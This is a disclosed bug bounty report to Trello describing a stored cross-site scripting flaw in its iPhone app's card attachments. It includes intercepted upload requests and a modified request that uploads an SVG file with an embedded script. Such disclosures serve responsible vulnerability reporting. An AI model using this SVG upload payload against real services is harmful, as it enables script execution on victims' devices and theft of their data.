@@ -1,0 +1,82 @@
+ReportLink:https://hackerone.com/reports/227853
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/ajdumanhug
+ReportedTo:Trello(trello)
+BountyAmount:256.0
+Severity:medium
+State:Closed
+DateOfDisclosure:12.07.2017 0:49:07
+
+Summary:
+
+##Description
+
+There is a Stored Cross-Site Scripting vulnerability on Trello's iPhone App due to the incorrect handling of the uploaded file in Trello's Card Attachment. This allows an attacker to execute JavaScript.
+
+##Proof of Concept
+
+I used Burpsuite to intercept the request and 2 devices (Laptop and iPhone) for this attack.
+
+To reproduce the issue, kindly follow the steps below:
+- Using your smartphone, open Trello and go to any Board then open a Card.
+- Upload a photo
+- Intercept the upload request on your Laptop using BurpSuite
+
+Below is the Original POST request of uploading a photo:
+```
+POST /1//cards/5915644dae2ea048b4c08c47/attachments?returnAllAttachments=0 HTTP/1.1
+Host: trello.com
+X-Trello-Background-Sync: 0
+Accept: */*
+Authorization: {Redacted}
+x-trello-run-once: {Redacted}
+Accept-Language: en-PH;q=1, zh-Hans-PH;q=0.9, fil-PH;q=0.8
+Content-Type: multipart/form-data; boundary=Boundary+CBEDF07345043145
+Content-Length: 372690
+User-Agent: Trello/4.0.0 (iPhone; iOS 10.2; Scale/3.00)
+Connection: close
+Cookie: mobileApp=true; {Redacted}
+
+--Boundary+CBEDF07345043145
+Content-Disposition: form-data; name="file"; filename="photo.jpg"
+Content-Type: image/jpeg
+	
+{Redacted the Content}
+--Boundary+CBEDF07345043145--
+```
+
+Below is the Modified POST Request. I modified the ```Content Type```, ```filename``` and ```Content```.
+
+```
+POST /1//cards/5915644dae2ea048b4c08c47/attachments?returnAllAttachments=0 HTTP/1.1
+Host: trello.com
+X-Trello-Background-Sync: 0
+Accept: */*
+Authorization: {Redacted}
+x-trello-run-once: {Redacted}
+Accept-Language: en-PH;q=1, zh-Hans-PH;q=0.9, fil-PH;q=0.8
+Content-Type: multipart/form-data; boundary=Boundary+CBEDF07345043145
+Content-Length: 372690
+User-Agent: Trello/4.0.0 (iPhone; iOS 10.2; Scale/3.00)
+Connection: close
+Cookie: mobileApp=true; {Redacted}
+
+--Boundary+CBEDF07345043145
+Content-Disposition: form-data; name="file"; filename="test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert(document.location);</script>
+</svg>
+--Boundary+CBEDF07345043145--
+```
+
+- Continue the Request and it should be uploaded without any error.
+- Then, to trigger the XSS, the victim will just open the uploaded file and Javascript will pop up.
+
+##Screenshot
+{F183957}
+
+##Impact
+An attacker can upload a malicious file that could execute something inside the iPhone because the file is being stored locally. I used ```document.location``` to get the location of the file.
